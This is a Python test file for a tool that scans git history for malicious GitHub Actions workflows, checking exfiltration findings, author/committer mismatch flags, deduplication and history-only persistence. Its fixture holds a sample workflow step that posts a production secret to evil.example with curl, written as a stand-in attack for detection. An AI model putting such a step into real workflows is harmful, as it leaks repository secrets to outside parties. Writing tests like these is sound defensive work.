# tests/test_workflow_history.py
import subprocess
from pathlib import Path

import pytest

from credence.workflow_audit.history import scan_history


def _git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True,
                   capture_output=True, text=True)


@pytest.fixture
def repo(tmp_path):
    _git(tmp_path, "init", "-q")
    _git(tmp_path, "config", "user.email", "dev@example.com")
    _git(tmp_path, "config", "user.name", "Dev")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    return tmp_path


def _write_commit(repo, relpath, content, *, name="Dev", email="dev@example.com"):
    p = repo / relpath
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    _git(repo, "add", relpath)
    _git(repo, "-c", f"user.name={name}", "-c", f"user.email={email}",
         "commit", "-q", "-m", f"add {relpath}")


MALICIOUS = (
    "on: push\njobs:\n  b:\n    runs-on: x\n    env:\n      T: ${{ secrets.PROD }}\n"
    "    steps:\n      - run: curl -d \"$T\" https://evil.example\n"
)


def test_history_scan_finds_threat_in_past_commit(repo):
    _write_commit(repo, ".github/workflows/staging.yml", MALICIOUS)
    findings = scan_history(repo)
    assert any(f.rule_id == "WF-EXFIL-001" and f.source == "history"
               for f in findings)
    f = [x for x in findings if x.rule_id == "WF-EXFIL-001"][0]
    assert f.commit and f.author == "Dev" and f.commit_date


def test_history_scan_clean_repo_returns_empty(repo):
    _write_commit(repo, ".github/workflows/ci.yml",
                  "on: push\npermissions: read-all\njobs:\n  b:\n    runs-on: x\n"
                  "    permissions:\n      contents: read\n"
                  "    steps:\n      - run: echo hi\n")
    assert scan_history(repo) == []


def test_identity_flags_author_committer_mismatch_and_first_timer(repo):
    # an existing contributor establishes history first
    _write_commit(repo, "README.md", "hi", name="Dev", email="dev@example.com")
    # a brand-new author commits a malicious workflow (author != committer via -c)
    p = repo / ".github/workflows/staging.yml"
    p.write_text(MALICIOUS)
    _git(repo, "add", ".github/workflows/staging.yml")
    subprocess.run(
        ["git", "-C", str(repo),
         "-c", "user.name=Committer", "-c", "user.email=committer@ci.example",
         "commit", "-q",
         "--author=ci-bot <ci-bot@noreply.example>", "-m", "build optimization"],
        check=True, capture_output=True, text=True)

    findings = scan_history(repo)
    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"][0]
    assert "author_committer_mismatch" in exfil.identity_flags
    assert "first_time_contributor_touching_workflows" in exfil.identity_flags
    # identity never changes severity (still HIGH from content)
    assert exfil.severity.value == "HIGH"


def test_dedup_keeps_earliest_commit(repo):
    _write_commit(repo, ".github/workflows/s.yml", MALICIOUS)      # introduce
    (repo / ".github/workflows/s.yml").write_text(MALICIOUS + "# trivially edited\n")
    _git(repo, "add", ".github/workflows/s.yml")
    _git(repo, "commit", "-q", "-m", "tweak")                      # re-touch
    findings = scan_history(repo, dedup=True)
    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"]
    assert len(exfil) == 1   # earliest only


def test_persists_in_history_only_when_file_gone_from_working_tree(repo):
    _write_commit(repo, ".github/workflows/s.yml", MALICIOUS)
    _git(repo, "rm", "-q", ".github/workflows/s.yml")
    _git(repo, "commit", "-q", "-m", "delete workflow")
    findings = scan_history(repo, working_tree_paths=set(), dedup=True)
    hist = [f for f in findings if f.rule_id == "WF-HIST-001"]
    assert hist and hist[0].persists_in_history_only is True
    assert hist[0].severity.value in ("HIGH", "CRITICAL")
